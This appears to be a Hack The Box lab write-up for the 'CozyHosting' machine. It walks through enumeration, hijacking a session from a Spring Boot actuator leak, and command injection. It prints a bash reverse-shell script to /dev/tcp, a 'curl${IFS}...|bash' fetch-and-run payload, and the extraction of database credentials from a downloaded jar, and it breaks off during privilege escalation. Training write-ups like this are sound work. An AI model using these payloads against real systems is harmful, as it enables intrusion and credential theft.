---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: springboot commandinjection informationleakeage remotecodeexecution reverseshell bash ${ifs} postgresql jd-gui jar ssh gtfobins sudoers
---

<br />

![1](../../../assets/images/CozyHosting/1.png)

<br />

OS -> Linux.

Difficulty -> Easy 

<br />

# Introduction:
<br />



<br />

# Enumeration:

<br />

We start by running the typical nmap scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.11.230 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 15:24 CET
Nmap scan report for 10.10.11.230
Host is up (0.94s latency).
Not shown: 62221 closed tcp ports (reset), 3312 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.98 seconds
```

<br />

Open Ports:

- `Port 22` -> ssh

- `Port 80` -> http

<br />

# Http Enumeration: -> Port 80

<br />

Proceed to list the `website` and it redirects to `cozyhosting.htb`, so we add this domain to our `/etc/hosts`:

<br />

```bash
❯ echo '10.10.11.230 cozyhosting.htb' >> /etc/hosts
```

<br />

The website is very `static` and doesn't has `anything interesting`, only a `/login`:

<br />

![2](../../../assets/images/CozyHosting/2.png)

<br />

Try `creds` like `admin:admin` but don't work:

<br />

![3](../../../assets/images/CozyHosting/3.png)

<br />

The `404 error page` seems interesting:

<br />

![4](../../../assets/images/CozyHosting/4.png)

<br />

Search about this error on Google and I discover that `Spring Boot` its being used in the `backend` of the `Server`:

<br />

![5](../../../assets/images/CozyHosting/5.png)

<br />

# Information Leakeage:

<br />

As we know, there are `specific dictionaries` for this type of `framework`, so we proceed to fuzz with `wfuzz` using the dictionary `"spring-boot.txt"` from the [SecLists](https://github.com/danielmiessler/SecLists) of Daniel Miessler and discover the following `paths`:

<br />

```bash
❯ wfuzz -c -t 50 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/spring-boot.txt http://cozyhosting.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cozyhosting.htb/FUZZ
Total requests: 112

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000041:   200        0 L      13 W       487 Ch      "actuator/env/lang"                                                                                                    
000000044:   200        0 L      13 W       487 Ch      "actuator/env/path"                                                                                                    
000000039:   200        0 L      13 W       487 Ch      "actuator/env/home"                                                                                                    
000000029:   200        0 L      1 W        634 Ch      "actuator"                                                                                                             
000000051:   200        0 L      1 W        15 Ch       "actuator/health"                                                                                                      
000000072:   200        0 L      1 W        48 Ch       "actuator/sessions"                                                                                                    
000000038:   200        0 L      120 W      4957 Ch     "actuator/env"                                                                                                         
000000058:   200        0 L      108 W      9938 Ch     "actuator/mappings"                                                                                                    
000000032:   200        0 L      542 W      127224 Ch   "actuator/beans"                                                                                                       

Total time: 0.748504
Processed Requests: 112
Filtered Requests: 103
Requests/sec.: 149.6316
```

<br />

Of all these paths, we proceed to list `first` the one that seems `most interesting` to me, which is ``/actuator/sessions``:

<br />

![6](../../../assets/images/CozyHosting/6.png)

<br />

It seems to be a `session cookie`, let's try to `set it` and load again the `/login` page:

<br />

![7](../../../assets/images/CozyHosting/7.png)

<br />

Perfect!! We have access to an `Administration Panel` as the user `K.Anderson`:

<br />

![8](../../../assets/images/CozyHosting/8.png)

<br />

# Command Injection:

<br />

At the `bottom` of the page, we see a `funcionality` that seems very interesting:

<br />

![9](../../../assets/images/CozyHosting/9.png)

<br />

Let's `intercept` the petition with `Burp Suite` to test different things:

<br />

![10](../../../assets/images/CozyHosting/10.png)

<br />

As we can see, there is a `error` in the response `"Could not resolve hostname testing"`.

It seems that the server is running `ssh` behind the scenes to `try to connect`, let's inject a `command` in the `username` field:

<br />

![11](../../../assets/images/CozyHosting/11.png)

<br />

Yesss!! We are able to inject a command as the user `"app"`.

In `Bash`, there are many ways to handle `spaces` between commands. One of the most popular is by using the `${IFS}` environment variable, which defines the `Internal Field Separator` and, by default, includes `space`, tab `(\t)` and newline `(\n)`. So we try to do it with a `curl`:

<br />

![12](../../../assets/images/CozyHosting/12.png)

<br />

See the message `"HTTP Status 400 - Bad Request"` in the response but it `works`, we have `received` the curl:

<br />

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.230 - - [26/Jan/2025 21:11:37] "GET / HTTP/1.1" 200 -
```

<br />

As we know if we are able to receive a `curl` we can gain `access` to the machine with a `Reverse Shell`.

So we proceed to create a `shell.sh` file with the following `code`:

<br />

```bash
#!/bin/bash 

bash -i >& /dev/tcp/10.10.14.17/443 0>&1

```

<br />

Now that we have the `file`, we run a `curl` again but `poiting` to the `shell.sh` and `interpreting` it with `bash`:

- Payload -> `curl${IFS}10.10.14.17|bash`

<br />

![13](../../../assets/images/CozyHosting/13.png)

<br />

Check the `listener` and... YES!

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.230] 35018
bash: cannot set terminal process group (1061): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
```

<br />

# Privilege Escalation: app -> josh

<br />

We are in as the user `app`, but when we try to visit `/home/josh` -> `"Permission denied"`:

<br />

```bash
app@cozyhosting:/home$ ls
josh
app@cozyhosting:/home$ cd josh
bash: cd: josh: Permission denied
```

<br />

Continue enumerating the `system` and we found in the directory `/app` a interesting `.jar file`, so we `transfer` it to our machine:

<br />

```bash
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
app@cozyhosting:/app$ python3 -m http.server 8082
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
```

<br />

Run `wget`:

<br />

```bash
❯ wget http://10.10.11.230:8082/cloudhosting-0.0.1.jar
--2025-01-26 21:55:32--  http://10.10.11.230:8082/cloudhosting-0.0.1.jar
Conectando con 10.10.11.230:8082... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 60259688 (57M) [application/java-archive]
Grabando a: «cloudhosting-0.0.1.jar»

cloudhosting-0.0.1.jar                        100%[=================================================================================================>]  57,47M   665KB/s    en 2m 35s  

2025-01-26 21:58:08 (380 KB/s) - «cloudhosting-0.0.1.jar» guardado [60259688/60259688]```

<br />

Once we have the `file` in our machine, proceed to `enumerate` with `jd-gui` and we found `postgresql credentials`:

<br />

```bash
jd-gui cloudhosting-0.0.1.jar & disown
```

<br />

![14](../../../assets/images/CozyHosting/14.png)

<br />


